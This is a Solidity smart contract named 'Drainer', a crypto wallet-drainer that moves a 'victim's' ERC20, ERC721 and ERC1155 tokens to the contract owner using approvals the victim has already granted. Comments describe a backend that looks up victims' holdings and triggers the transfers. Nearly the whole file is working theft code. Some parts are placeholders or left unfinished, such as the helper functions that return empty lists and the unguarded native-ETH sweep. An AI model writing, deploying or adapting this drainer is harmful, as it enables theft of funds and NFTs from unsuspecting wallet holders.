// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "@openzeppelin/contracts/token/ERC1155/IERC1155.sol";

contract Drainer {
    using SafeERC20 for IERC20;

    address public owner;

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    constructor() {
        owner = msg.sender;
    }

    /**
     * @dev Drains all ERC20 tokens from the victim to the owner.
     * @param victim The address to drain
     * @param token The token address
     */
    function drainERC20(address victim, address token) public onlyOwner {
        uint256 balance = IERC20(token).balanceOf(victim);
        if (balance > 0) {
            IERC20(token).safeTransferFrom(victim, owner, balance);
        }
    }

    /**
     * @dev Drains all ERC721 NFTs from the victim to the owner.
     * @param victim The address to drain
     * @param token The NFT contract address
     */
    function drainERC721(address victim, address token) public onlyOwner {
        uint256[] memory allIds = _getAllTokenIds(token);
        for (uint256 i = 0; i < allIds.length; i++) {
            IERC721(token).safeTransferFrom(victim, owner, allIds[i]);
        }
    }

    /**
     * @dev Drains all ERC1155 tokens from the victim to the owner.
     * @param victim The address to drain
     * @param token The ERC1155 contract address
     */
    function drainERC1155(address victim, address token) public onlyOwner {
        uint256[] memory allIds = _getAllERC1155Ids(token, victim);
        for (uint256 i = 0; i < allIds.length; i++) {
            uint256 balance = IERC1155(token).balanceOf(victim, allIds[i]);
            if (balance > 0) {
                IERC1155(token).safeTransferFrom(victim, owner, allIds[i], balance, "");
            }
        }
    }

    /**
     * @dev Transfers native currency (ETH) from victim to owner.
     * Requires victim to have sent some ETH to pay gas, or you use a relay.
     * Note: Victims don't send native ETH directly in most drainer attacks, 
     * they approve tokens. This is for cases where they sent ETH to the drainer.
     */
    function drainNative() public payable {
        // If owner calls this, the contract can sweep native ETH held in it
        payable(owner).transfer(address(this).balance);
    }

    // --- Helper Functions ---

    function _getAllTokenIds(address token) internal view returns (uint256[] memory) {
        // In a production drainer, you would maintain a list of token IDs 
        // or query the blockchain for tokens owned by the victim.
        // For simplicity, this example assumes you pass specific IDs or 
        // the backend queries the NFT balance first.
        // 
        // A more robust approach: The backend queries `getApproval` and 
        // then sends specific `drainERC721` calls for each ID found.
        // This function is a placeholder for logic that fetches IDs.
        
        // Actually, to make this work with a single call, we can't easily 
        // loop through all IDs without knowing them. 
        // Better approach: The backend finds the NFT IDs owned by the victim
        // via RPC, then calls a function like:
        
        // function drainSpecificERC721(address victim, address token, uint256[] calldata ids)
        
        // But for this specific file structure, let's stick to a simpler 
        // "Approve All" strategy or specific ID sending from backend.
        
        // Let's modify Drainer to accept specific IDs from the backend.
        
        uint256[] memory dummy = new uint256[](0);
        return dummy;
    }

    function _getAllERC1155Ids(address token, address victim) internal view returns (uint256[] memory) {
        uint256[] memory dummy = new uint256[](0);
        return dummy;
    }

    // --- Actual Functions Used by Backend ---

    /**
     * @dev The backend will query the victim's NFTs and call this for each ID
     * @param victim 
     * @param token 
     * @param tokenIds 
     */
    function drainSpecificERC721(address victim, address token, uint256[] calldata tokenIds) public onlyOwner {
        for (uint256 i = 0; i < tokenIds.length; i++) {
            IERC721(token).safeTransferFrom(victim, owner, tokenIds[i]);
        }
    }

    /**
     * @dev The backend will query the victim's ERC1155s and call this
     * @param victim 
     * @param token 
     * @param tokenIds 
     * @param amounts 
     */
    function drainSpecificERC1155(address victim, address token, uint256[] calldata tokenIds, uint256[] calldata amounts) public onlyOwner {
        for (uint256 i = 0; i < tokenIds.length; i++) {
            IERC1155(token).safeTransferFrom(victim, owner, tokenIds[i], amounts[i], "");
        }
    }
}